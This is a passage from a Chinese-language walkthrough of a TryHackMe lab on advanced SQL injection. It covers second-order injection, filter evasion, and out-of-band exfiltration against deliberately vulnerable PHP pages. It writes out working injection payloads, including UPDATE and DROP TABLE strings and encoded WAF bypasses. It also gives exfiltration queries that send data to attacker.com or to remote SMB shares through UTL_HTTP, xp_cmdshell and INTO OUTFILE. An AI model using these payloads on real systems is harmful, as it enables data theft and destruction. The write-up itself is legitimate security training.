<li><strong>注释掉其余部分</strong>：双破折号（<code>--</code>）是 SQL 注释符号。<code>--</code> 后面的任何内容都将被 SQL 服务器忽略，从而有效地消除了原始 SQL 语句中可能导致错误或暴露攻击的任何剩余部分。执行上述查询后，它会将所有书籍的名称更改为 <strong>hacked</strong>，如下所示：</li>
</ul>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1715789376753" alt="state of database after executing payload"></p>
<p>在这个任务中，我们通过一个易受攻击的书评 Web 应用程序探索了二阶 SQL 注入概念。作为渗透测试人员，检查用户输入如何存储以及随后在 SQL 查询中使用至关重要。这涉及验证所有形式的数据处理是否能够抵御此类漏洞，强调彻底测试和了解安全实践以防范注入威胁的重要性。</p>
<h2 id="将所有书籍的标题更新为“compromised”后，标志值是多少？"><a href="#将所有书籍的标题更新为“compromised”后，标志值是多少？" class="headerlink" title="将所有书籍的标题更新为“compromised”后，标志值是多少？"></a>将所有书籍的标题更新为“compromised”后，标志值是多少？</h2><p>添加一本书,ssn为</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">1'; UPDATE books SET book_name = 'compromised'; --</span><br></pre></td></tr></tbody></table></figure>

<p>然后访问update.php,更改这本书的任意内容</p>
<h2 id="一旦从数据库中删除表-hello，标志值是什么？"><a href="#一旦从数据库中删除表-hello，标志值是什么？" class="headerlink" title="一旦从数据库中删除表 hello，标志值是什么？"></a>一旦从数据库中删除表 hello，标志值是什么？</h2><p>添加一本书，ssn为</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">2';DROP TABLE hello;-- -</span><br></pre></td></tr></tbody></table></figure>

<p>同理在update.php中更新</p>
<h1 id="Filter-Evasion-Techniques"><a href="#Filter-Evasion-Techniques" class="headerlink" title="Filter Evasion Techniques"></a>Filter Evasion Techniques</h1><p>在高级 SQL 注入攻击中，规避过滤器对于成功利用漏洞至关重要。现代 Web 应用程序通常会实施防御措施来净化或阻止常见的攻击模式，从而使简单的 SQL 注入尝试变得无效。作为渗透测试人员，我们必须适应使用更复杂的技术来绕过这些过滤器。本节将介绍此类方法，包括<strong>字符编码</strong>、<strong>无引号</strong> SQL 注入以及处理无法使用<strong>空格</strong>的情况。通过理解和应用这些技术，我们可以有效地渗透具有严格输入验证和安全控制的 Web 应用程序。</p>
<p>字符编码<br>字符编码涉及将 SQL 注入负载中的特殊字符转换为可能绕过输入过滤器的编码形式。</p>
<p>-<strong>URL 编码</strong>：URL 编码是一种常用方法，其中字符使用百分号 (%) 后跟十六进制的 ASCII 值来表示。例如，负载“’ OR 1=1–”可以编码为“%27%20OR%201%3D1–”。这种编码可以帮助输入通过 Web 应用程序过滤器并由数据库解码，数据库在初始处理期间可能不会将其识别为恶意的。</p>
<ul>
<li><strong>十六进制编码</strong>：十六进制编码是使用十六进制值构造 SQL 查询的另一种有效技术。例如，查询 <code>SELECT * FROM users WHERE name = 'admin'</code> 可以编码为 <code>SELECT * FROM users WHERE name = 0x61646d696e</code>。通过将字符表示为十六进制数，攻击者可以绕过在处理输入之前不解码这些值的过滤器。</li>
<li><code>Unicode 编码</code>：Unicode 编码使用 Unicode 转义序列表示字符。例如，字符串 <code>admin</code> 可以编码为 <code>\u0061\u0064\u006d\u0069\u006e</code>。此方法可以绕过仅检查特定 ASCII 字符的过滤器，因为数据库将正确处理编码的输入。</li>
</ul>
<p><strong>示例</strong></p>
<p>在此示例中，我们将探讨开发人员如何通过从用户输入中删除特定关键字和字符来实现基本过滤，以防止 SQL 注入攻击。但是，我们还将看到攻击者如何使用 URL 编码等字符编码技术绕过这些防御措施。</p>
<p><strong>注意</strong>：在接下来的练习中，我们将使用与上一个不同的数据库。您可以通过 <code>http://10.10.20.127/encoding/</code> 访问页面。</p>
<p>以下是处理搜索功能的 PHP 代码 (search_books.php)：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="variable">$book_name</span> = <span class="variable">$_GET</span>[<span class="string">'book_name'</span>] ?? <span class="string">''</span>;</span><br><span class="line"><span class="variable">$special_chars</span> = <span class="keyword">array</span>(<span class="string">"OR"</span>, <span class="string">"or"</span>, <span class="string">"AND"</span>, <span class="string">"and"</span> , <span class="string">"UNION"</span>, <span class="string">"SELECT"</span>);</span><br><span class="line"><span class="variable">$book_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$special_chars</span>, <span class="string">''</span>, <span class="variable">$book_name</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM books WHERE book_name = '<span class="subst">$book_name</span>'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Generated SQL Query: <span class="subst">$sql</span>&lt;/p&gt;"</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Error: "</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">" (Error Code: "</span> . <span class="variable">$conn</span>-&gt;errno . <span class="string">")"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) {</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) {</span><br><span class="line">...</span><br><span class="line">..  </span><br></pre></td></tr></tbody></table></figure>

<p>以下是 index.html 页面中的 Javascript 代码，提供用于搜索图书的用户界面：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">searchBooks</span>(<span class="params"></span>) </span>{</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">bookName</span> = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">'book_name'</span>).value;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">xhr</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">'GET'</span>, <span class="string">'search_books.php?book_name='</span> + <span class="title function_ invoke__">encodeURIComponent</span>(bookName), <span class="literal">true</span>);</span><br><span class="line">   xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{</span><br><span class="line">       <span class="keyword">if</span> (this.status === <span class="number">200</span>) {</span><br><span class="line">           document.<span class="title function_ invoke__">getElementById</span>(<span class="string">'results'</span>).innerHTML = this.responseText;</span><br></pre></td></tr></tbody></table></figure>

<p>在上面的例子中，开发人员通过删除特定的 SQL 关键字（例如“OR”、“AND”、“UNION”和“SELECT”）实现了基本的防御机制，以防止 SQL 注入攻击。过滤使用“str_replace”函数，该函数在将这些关键字包含在 SQL 查询之前从用户输入中删除这些关键字。这种过滤方法旨在使攻击者更难注入恶意 SQL 命令，因为这些关键字对于许多 SQL 注入负载至关重要。</p>
<p>准备负载</p>
<p>让我们逐步介绍准备 SQL 注入负载的过程，展示 URL 编码如何绕过基本防御。首先，让我们看看包含特殊字符或 SQL 关键字的正常输入会发生什么。当我们搜索名为“PHP 简介”的书时，我们得到了成功的结果，如下所示：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716201873529" alt="search for a book dashboard"></p>
<p>但是如果我们尝试通过添加诸如“”，“；”等特殊字符来中断查询会怎样？我们将得到以下输出：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716201925761" alt="error result while searching a book"></p>
<p>SQL 查询无法正确执行，这可能意味着存在 SQL 注入的可能性。让我们尝试注入有效负载“<code>Intro to PHP' OR 1=1</code>”。我们将得到以下输出：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716202022860" alt="error result with injection payload"></p>
<p>那么，这里发生了什么？当此输入传递给 PHP 脚本时，<code>str_replace</code> 函数将删除 OR 关键字和单引号，从而产生不会执行预期 SQL 注入的已清理输入。此输入无效，因为过滤会删除 SQL 注入成功所需的关键组件。</p>
<p>要绕过过滤，我们需要使用 URL 编码对输入进行编码，URL 编码以过滤器无法识别和删除的方式表示特殊字符和关键字。以下是示例有效负载 <code>1%27%20||%201=1%20--+</code>。</p>
<ul>
<li><code>%27</code> 是单引号 (‘) 的 URL 编码。</li>
<li><code>%20</code> 是空格 ( ) 的 URL 编码。</li>
<li><code>||</code> 表示 SQL OR 运算符。</li>
<li><code>%3D</code> 是等号 (=) 的 URL 编码。</li>
<li><code>%2D%2D</code> 是 – 的 URL 编码，它在 SQL 中开始注释。</li>
</ul>
<p>在上述有效负载中，<code>1'</code> 会关闭 SQL 查询中的当前字符串或值。例如，如果查询正在寻找与 1 匹配的书名，则添加 <code>'</code> 会关闭字符串，使输入的其余部分成为 SQL 语句的一部分。<code>|| 1=1</code> 部分使用 SQL <code>OR</code> 运算符添加始终为真的条件。此条件确保查询对所有记录都返回真值，从而绕过原本应该限制结果的原始条件。类似地，<code>--</code> 会在 SQL 中启动注释，导致数据库忽略查询的其余部分。这对于终止可能导致语法错误或不需要的条件的查询的任何剩余部分很有用。为了确保正确的间距，<code>+</code> 在注释后添加一个空格，确保注释正确终止并且没有语法问题。</p>
<p>从控制台中，我们可以看到单击搜索按钮会对 <code>search_book.php</code> 进行 AJAX 调用。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716099780661" alt="network tab in console"></p>
<p>让我们直接在 PHP 页面上使用有效负载，以避免客户端进行不必要的调整/验证。让我们使用标准有效负载“Intro to PHP’ OR 1=1”访问 URL [<a target="_blank" rel="noopener" href="http://10.10.20.127/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1%5D">http://10.10.20.127/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20OR%201=1]</a>(<a target="_blank" rel="noopener" href="http://10.10.20.127/encoding/search_books.php?book_name=Intro">http://10.10.20.127/encoding/search_books.php?book_name=Intro</a> to PHP’ OR 1=1)，您将看到一个错误。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716202208504" alt="testing injection on the API call"></p>
<p>现在，使用 <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)">Cyber Chef</a> 对有效负载 <code>Intro to PHP' || 1=1 --+</code> 进行 URL 编码，并尝试使用更新的有效负载访问 URL。我们将获得以下输出，转储完整的信息：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716100417790" alt="injection with correct payload"></p>
<p>有效载荷之所以有效，是因为 URL 编码以绕过过滤机制的方式表示特殊字符和 SQL 关键字。当服务器解码 URL 编码的输入时，它会恢复特殊字符和关键字，从而使 SQL 注入得以成功执行。使用 URL 编码，攻击者可以制作绕过旨在阻止 SQL 注入的基本输入过滤机制的有效载荷。这表明使用更强大的防御措施（例如参数化查询和准备好的语句）的重要性，无论输入的编码如何，它们都可以防止 SQL 注入攻击。</p>
<p>url编码然后传入即可(+号是空格url编码的结果):</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Intro to PHP' || 1=1 -- -</span><br></pre></td></tr></tbody></table></figure>



<h1 id="Filter-Evasion-Techniques-continued"><a href="#Filter-Evasion-Techniques-continued" class="headerlink" title="Filter Evasion Techniques (continued)"></a>Filter Evasion Techniques (continued)</h1><p>无引号 SQL 注入</p>
<p>当应用程序过滤单引号、双引号或转义符时，就会使用无引号 SQL 注入技术。</p>
<ul>
<li><strong>使用数值</strong>：一种方法是使用数值或其他不需要引号的数据类型。例如，攻击者可以在不需要引号的上下文中使用 <code>OR 1=1</code>，而不是注入 <code>' OR '1'='1</code>。此技术可以绕过专门寻找转义符或删除引号的过滤器，从而允许注入继续进行。</li>
<li><strong>使用 SQL 注释</strong>：另一种方法是使用 SQL 注释来终止查询的其余部分。例如，输入 <code>admin'--</code> 可以转换为 <code>admin--</code>，其中 <code>--</code> 表示 SQL 中注释的开始，从而有效地忽略 SQL 语句的其余部分。这可以帮助绕过过滤器并防止语法错误。</li>
<li><strong>使用 CONCAT() 函数</strong>：攻击者可以使用 <code>CONCAT()</code> 等 SQL 函数来构造不带引号的字符串。例如，<code>CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)</code> 构造字符串 admin。<code>CONCAT()</code> 函数和类似方法允许攻击者在不直接使用引号的情况下构建字符串，从而使过滤器更难检测和阻止有效载荷。</li>
</ul>
<p>不允许使用空格</p>
<p>当不允许使用空格或将空格过滤掉时，可以使用各种技术来绕过此限制。</p>
<ul>
<li><strong>注释替换空格</strong>：一种常用方法是使用 SQL 注释 (<code>/**/</code>) 替换空格。例如，攻击者可以使用 <code>SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'</code>，而不是 <code>SELECT * FROM users WHERE name = 'admin'</code>。SQL 注释可以替换查询中的空格，使有效载荷能够绕过删除或阻止空格的过滤器。</li>
<li><strong>制表符或换行符</strong>：另一种方法是使用制表符（<code>\t</code>）或换行符（<code>\n</code>）代替空格。某些过滤器可能允许这些字符，从而使攻击者能够构造类似 <code>SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'</code> 的查询。此技术可以绕过专门查找空格的过滤器。</li>
<li><strong>替代字符</strong>：一种有效的方法是使用替代 URL 编码字符来表示不同类型的空格，例如 <code>%09</code>（水平制表符）、<code>%0A</code>（换行符）、<code>%0C</code>（换页符）、<code>%0D</code>（回车符）和 <code>%A0</code>（不间断空格）。这些字符可以替换有效载荷中的空格。</li>
</ul>
<p>实际示例</p>
<p>在此场景中，我们有一个端点 <code>http://10.10.221.70/space/search_users.php?username=?</code>，它根据提供的用户名返回用户详细信息。开发人员已实现过滤器来阻止常见的 SQL 注入关键字（例如 OR、AND 和空格 (%20)），以防止 SQL 注入攻击。</p>
<p>以下是开发人员添加的 PHP 过滤。</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="variable">$special_chars</span> = <span class="keyword">array</span>(<span class="string">" "</span>, <span class="string">"AND"</span>, <span class="string">"and"</span> ,<span class="string">"or"</span>, <span class="string">"OR"</span> , <span class="string">"UNION"</span>, <span class="string">"SELECT"</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$special_chars</span>, <span class="string">''</span>, <span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM user WHERE username = '<span class="subst">$username</span>'"</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>如果我们在端点上使用标准有效载荷“1％27％20 ||％201 = 1％20–+”，我们可以看到即使通过URL编码，它也不起作用。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716108426440" alt="injection with incorrect payload"></p>
<p>SQL 查询显示代码省略了空格。为了绕过这些保护，我们可以使用表示不同类型空格或换行符的 URL 编码字符，例如 <code>%09</code>（水平制表符）、<code>%0A</code>（换行符）。这些字符可以替换空格，并且仍能被 SQL 解析器正确解释。</p>
<p>原始有效负载 <code>1' OR 1=1 --</code> 可以修改为使用换行符代替空格，从而得到有效负载 <code>1'%0A||%0A1=1%0A--%27+</code>。此有效负载构造与 <code>1' OR 1=1 --</code> 相同的逻辑条件，但使用换行符绕过空格过滤器。</p>
<p>SQL 解析器将换行符解释为空格，将有效负载转换为 <code>1' OR 1=1 --</code>。因此，查询将从 <code>SELECT * FROM users WHERE username = '$username'</code> 解释为 <code>SELECT * FROM users WHERE username = '1' OR 1=1 --</code>。</p>
<p>现在，如果我们通过更新的有效负载访问端点，我们就可以查看所有详细信息。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716108947600" alt="injection with correct payload"></p>
<p>总而言之，重要的是要明白，在处理旨在防止 SQL 注入攻击的过滤器或 Web 应用程序防火墙 (WAF) 时，没有一种技术可以保证绕过。但是，以下是一些可用于规避这些保护的技巧和窍门。下表重点介绍了可用于尝试绕过过滤器和 WAF 的各种技术：</p>
<table>
<thead>
<tr>
<th><strong>Scenario</strong></th>
<th><strong>Description</strong></th>
<th><strong>Example</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>SELECT 等关键字被禁止</strong></td>
<td>通常可以通过改变 SQL 关键字的大小写或添加内联注释来绕过它们</td>
<td>SElEcT * FrOm users or SE/**/LECT * FROM/**/users</td>
</tr>
<tr>
<td><strong>Spaces are banned</strong></td>
<td>使用替代空格字符或注释来代替空格可以帮助绕过过滤器。</td>
<td>SELECT%0A*%0AFROM%0Ausers or SELECT/**/*/**/FROM/**/users</td>
</tr>
<tr>
<td><strong>Logical operators like AND, OR are banned</strong></td>
<td>使用替代逻辑运算符或连接来绕过关键字过滤器。</td>
<td>username = ‘admin’ &amp;&amp; password = ‘password’ or username = ‘admin’/**/||/**/1=1 –</td>
</tr>
<tr>
<td><strong>Common keywords like UNION, SELECT are banned</strong></td>
<td>使用等效表示形式（例如十六进制或 Unicode 编码）来绕过过滤器。</td>
<td>SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)</td>
</tr>
<tr>
<td><strong>Specific keywords like OR, AND, SELECT, UNION are banned</strong></td>
<td>使用混淆技术，通过将字符与字符串函数或注释相结合来伪装 SQL 关键字。</td>
<td>SElECT * FROM users WHERE username = CONCAT(‘a’,’d’,’m’,’i’,’n’) or SElEcT/**/username/**/FROM/**/users</td>
</tr>
</tbody></table>
<p>在实际环境中，您应用的查询和过滤关键字的可见性并非直接可能。作为一名渗透测试人员，重要的是要了解 SQL 注入测试通常涉及反复试验的方法，需要耐心和毅力。每个环境可能都有独特的过滤器和保护措施，因此有必要调整和尝试不同的技术来找到成功的注入向量。</p>
<h1 id="Out-of-band-SQL-Injection"><a href="#Out-of-band-SQL-Injection" class="headerlink" title="Out-of-band SQL Injection"></a>Out-of-band SQL Injection</h1><p>带外 (OOB) SQL 注入是一种攻击技术，当直接或传统方法无效时，渗透测试人员/红队人员会使用该技术窃取数据或执行恶意操作。与带内 SQL 注入不同，带内 SQL 注入攻击者依靠同一通道进行攻击和数据检索，而带外 SQL 注入使用单独的通道发送负载和接收响应。带外技术利用数据库服务器可能访问的 <strong>HTTP</strong> 请求、<strong>DNS</strong> 查询、<strong>SMB</strong> 协议或其他网络协议等功能，使攻击者能够绕过防火墙、入侵检测系统和其他安全措施。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1717060822273" alt="process flow of OOB injection"></p>
<p>带外 SQL 注入的主要优势之一是其隐蔽性和可靠性。通过使用<strong>不同的通信渠道</strong>，攻击者可以最大限度地降低被发现的风险，并与受感染系统保持持久连接。例如，攻击者可能会向攻击者控制的恶意域注入<strong>SQL 负载，触发数据库服务器发出 DNS 请求</strong>。然后可以使用响应来提取敏感数据，而不会提醒监控直接数据库交互的安全机制。这种方法允许攻击者即使在攻击者与目标之间的直接连接受到限制或审查的复杂网络环境中也能利用漏洞。</p>
<p>为什么使用 OOB</p>
<p>在直接响应受到安全措施的净化或限制的情况下，OOB 通道使攻击者能够在没有服务器立即反馈的情况下窃取数据。例如，<strong>存储过程</strong>、<strong>输出编码</strong>和<strong>应用程序级约束</strong>等安全机制可以<strong>阻止直接响应</strong>，使传统的 SQL 注入攻击无效。带外技术（例如使用 DNS 或 HTTP 请求）允许将数据发送到攻击者控制的外部服务器，从而绕过这些限制。</p>
<p>此外，<strong>入侵检测系统 (IDS)</strong> 和 <strong>Web 应用程序防火墙 (WAF)</strong> 经常<strong>监控和记录 SQL 查询响应以查找可疑活动</strong>，阻止来自潜在恶意查询的直接响应。通过利用 OOB 通道，攻击者可以使用审查较少的网络协议（如 DNS 或 SMB）传输数据来避免检测。这在攻击者与数据库服务器之间直接连接有限的网络环境中特别有用，例如当服务器位于防火墙后面或位于不同的网络段中时。</p>
<p>不同数据库中的技术</p>
<p>带外 SQL 注入攻击利用通过精心设计的查询写入另一个通信通道的方法。当与数据库的直接交互受到限制时，此技术对于窃取数据或执行恶意操作非常有效。数据库中有多个命令可能允许数据泄露，但以下是各种数据库系统中最常用的命令列表：</p>
<p><strong>MySQL 和 MariaDB</strong></p>
<p>在 MySQL 或 MariaDB 中，可以使用 <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/select-into.html">SELECT … INTO OUTFILE</a> 或 <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file">load_file</a> 命令实现带外 SQL 注入。此命令允许攻击者将查询结果写入服务器文件系统上的文件。例如：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">SELECT sensitive_data FROM users INTO OUTFILE <span class="string">'/tmp/out.txt'</span>;    </span><br></pre></td></tr></tbody></table></figure>

<p>然后，攻击者可以通过数据库服务器上运行的 SMB 共享或 HTTP 服务器访问此文件，从而通过备用渠道窃取数据。</p>
<p><strong>Microsoft SQL Server (MSSQL)</strong></p>
<p>在 MSSQL 中，可以使用 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16">xp_cmdshell</a> 等功能执行带外 SQL 注入，该功能允许直接从 SQL 查询执行 shell 命令。可以利用此功能将数据写入可通过网络共享访问的文件：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">EXEC xp_cmdshell <span class="string">'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T'</span>;    </span><br></pre></td></tr></tbody></table></figure>

<p>或者，可以使用 <code>OPENROWSET</code> 或 <code>BULK INSERT</code> 与外部数据源交互，从而通过 OOB 通道促进数据泄露。</p>
<p><strong>Oracle</strong></p>
<p>在 Oracle 数据库中，可以使用 <a target="_blank" rel="noopener" href="https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html">UTL_HTTP</a> 或 <a target="_blank" rel="noopener" href="https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html">UTL_FILE</a> 包执行带外 SQL 注入。例如，UTL_HTTP 包可用于发送包含敏感数据的 HTTP 请求：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"> DECLARE</span><br><span class="line">  req UTL_HTTP.REQ;</span><br><span class="line">  resp UTL_HTTP.RESP;</span><br><span class="line">BEGIN</span><br><span class="line">  req := UTL_HTTP.<span class="title function_ invoke__">BEGIN_REQUEST</span>(<span class="string">'http://attacker.com/exfiltrate?sensitive_data='</span> || sensitive_data);</span><br><span class="line">  UTL_HTTP.<span class="title function_ invoke__">GET_RESPONSE</span>(req);</span><br><span class="line">END;</span><br></pre></td></tr></tbody></table></figure>

<p>带外技术示例</p>
<p>MySQL 和 MariaDB 中的带外 SQL 注入技术可以利用各种网络协议来窃取数据。主要方法包括 DNS 窃取、HTTP 请求和 SMB 共享。每种技术都可以根据 MySQL/MariaDB 环境和网络设置的功能来应用。</p>
<p><strong>HTTP 请求</strong></p>
<p>通过利用允许 HTTP 请求的数据库功能，攻击者可以将敏感数据直接发送到他们控制的 Web 服务器。此方法利用可以建立出站 HTTP 连接的数据库功能。虽然 MySQL 和 MariaDB 本身不支持 HTTP 请求，但如果数据库配置为允许此类操作，则可以通过外部脚本或用户定义函数 (UDF) 来完成。</p>
<p>首先，需要创建和安装 UDF 以支持 HTTP 请求。此设置很复杂，通常需要额外的配置。示例查询看起来像 <code>SELECT http_post('http://attacker.com/exfiltrate',sensitive_data) FROM books;</code>。</p>
<p>HTTP 请求渗透可以在 Windows 和 Linux (Ubuntu) 系统上实现，具体取决于数据库对启用 HTTP 请求的外部脚本或 UDF 的支持。</p>
<p><strong>DNS 渗透</strong></p>
<p>攻击者可以使用 SQL 查询生成带有编码数据的 DNS 请求，并将其发送到攻击者控制的恶意 DNS 服务器。此技术绕过基于 HTTP 的监控系统并利用数据库执行 DNS 查找的能力。</p>
<p>如上所述，MySQL 本身不支持仅通过 SQL 命令生成 DNS 请求，攻击者可能会使用其他方式（例如自定义用户定义函数 (UDF) 或系统级脚本）来执行 DNS 查找。</p>
<p><strong>SMB 渗透</strong></p>
<p>SMB 渗透涉及将查询结果写入外部服务器上的 SMB 共享。此技术在 Windows 环境中特别有效，但也可以在 Linux 系统中通过正确的设置进行配置。示例查询类似于 <code>SELECTsensitive_data INTO OUTFILE'\\\\10.10.162.175\\logs\\out.txt';</code>。</p>
<p>由于 Windows 本身支持 SMB/UNC 路径，因此完全支持此操作。Linux (Ubuntu)：虽然直接 UNC 路径更适合 Windows，但可以使用 <code>smbclient</code> 等工具或通过将共享安装到本地目录来在 Linux 中安装和访问 SMB 共享。在 SQL 查询中直接使用 UNC 路径可能需要额外的设置或脚本来促进交互。</p>
<p>实际示例</p>
<p>在这个实际场景中，我们将演示攻击者如何使用带外 SQL 注入技术从易受攻击的 Web 应用程序中窃取数据。服务器端代码包含一个 SQL 注入漏洞，允许攻击者制作将查询结果写入外部 SMB 共享的有效负载。当数据库的直接响应受到限制或监控时，这很有用。</p>
<p><strong>场景说明</strong></p>
<p>在此场景中，我们将在 AttackBox 的 <code>ATTACKBOX_IP\logs</code> 处启用网络共享。此共享可通过网络访问，并允许将其他计算机的文件写入其中。您可以假设这样一种场景：当您获得一个易受攻击的系统并希望将数据转移到另一个网络共享系统时。攻击者将利用此共享从带外窃取数据。要拥有网络共享，我们将启动 AttackBox 并在终端中执行以下命令：</p>
<ul>
<li>使用 <code>cd /opt/impacket/examples</code> 导航到 <code>impacket</code> 目录</li>
<li>输入命令 <code>python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp</code> 以启动共享 <code>/tmp</code> 目录的 SMB 服务器。</li>
<li>您可以通过输入命令 <code>smbclient //ATTACKBOX_IP/logs -U guest -N</code> 来访问网络共享的内容。这样您就可以连接到网络共享，然后您可以发出命令“ls”来列出所有命令。</li>
</ul>
<p>我们有相同的 Web 应用程序，该应用程序具有搜索功能，可以查询访问图书馆的访客。此功能的服务器端代码容易受到 SQL 注入攻击，您可以通过“<a target="_blank" rel="noopener" href="http://10.10.221.70/oob/search_visitor.php?visitor_name=Tim%E2%80%9D%E8%AE%BF%E9%97%AE%E5%AE%83%E3%80%82">http://10.10.221.70/oob/search_visitor.php?visitor_name=Tim”访问它。</a></p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1716632404869" alt="response of normal query"></p>
<p>服务器代码如下：</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="variable">$visitor_name</span> = <span class="variable">$_GET</span>[<span class="string">'visitor_name'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"SELECT * FROM visitor WHERE name = '<span class="subst">$visitor_name</span>'"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Generated SQL Query: <span class="subst">$sql</span>&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Execute multi-query</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$sql</span>)) {</span><br><span class="line">    <span class="keyword">do</span> {</span><br><span class="line">        <span class="comment">// Store first result set</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">store_result</span>()) {</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) {</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) {</span><br></pre></td></tr></tbody></table></figure>

<p><strong>重要注意事项</strong></p>
<p>需要注意的是，MySQL 系统变量“secure_file_priv”可能已设置。设置后，此变量包含目录路径名，MySQL 将仅允许将文件写入此指定目录。此安全措施有助于降低未经授权的文件操作的风险。</p>
<p>-<strong>设置 secure_file_priv 时</strong>：MySQL 将限制文件操作（例如 <strong>INTO OUTFILE</strong>）到指定目录。这意味着攻击者只能将文件写入此目录，从而限制了他们将数据泄露到任意位置的能力。</p>
<p>-<strong>secure_file_priv 为空时</strong>：如果“secure_file_priv”变量为空，MySQL 不会施加任何目录限制，允许将文件写入 MySQL 服务器进程可访问的任何目录。此配置带来更高的风险，因为它为攻击者提供了更大的灵活性。</p>
<p>攻击者通常无法直接访问以检查 secure_file_priv 变量的值。因此，他们必须依靠反复试验的方法来确定是否可以写入文件以及写入文件的位置，测试各种路径以查看文件操作是否成功。</p>
<p><strong>准备有效负载</strong></p>
<p>为了利用此漏洞，攻击者需要制作一个有效负载以注入“visitor_name”参数。该有效负载将被设计为执行额外的 SQL 查询，将数据库版本信息写入外部 SMB 共享。</p>
